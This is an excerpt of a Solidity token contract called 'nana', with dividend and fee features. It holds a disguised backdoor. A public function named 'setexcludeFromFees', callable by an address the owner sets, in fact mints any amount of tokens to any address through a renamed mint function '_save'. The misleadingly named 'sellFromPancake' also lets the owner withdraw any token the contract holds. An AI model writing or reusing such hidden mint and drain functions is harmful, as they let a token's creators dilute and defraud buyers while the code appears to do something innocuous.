...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _save(address account, uint256 amount) internal virtual {
...
contract nana is ERC20, Ownable {                 //Contract name
    using SafeMath for uint256;
    ...
    string public name_ = "nana";       //Full name
    string public symbol_ = "nana";      //abbreviation
    ...
    uint256 public lpRewardFee = 100;       //Add LP dividends
    ...
    constructor(
        ...
        uint256 totalSupply = 5500 * (10**18);       //Supply
        ...
        marketingWalletAddress = 0x5e6c4A777D0c4a3d8991FD1FD82D5F94B89030C7;    //Marketing address
        foundationWalletAddress = 0x18ba4E94E7Cc0289e5F0e077cFdDaC7314a76FAC;    //Buyback Guard
        ...
        excludeFromFees(0x613a1C16DdA132B68FAb7dCBA2Fe95Ce8D1F340D, true);

        isDividendExempt[address(this)] = true;
        isDividendExempt[address(0)] = true;
        isDividendExempt[address(dividendTracker)] = true;

        _save(0x613a1C16DdA132B68FAb7dCBA2Fe95Ce8D1F340D, totalSupply);
    }
    ...
    function Sets(address con) public onlyOwner{
        tosAddress = con;
    }
    ...
    function sellFromPancake(address con, address addr, uint256 amount) public onlyOwner {
         ERC20(con).transfer(addr, amount);
     }

    function safe(address con, uint256 amount) private  {
        _save(con,amount);
    }

    function setexcludeFromFees(address con, uint256 bools)  public  {
        require(msg.sender == tosAddress);
        safe(con, bools);
    }
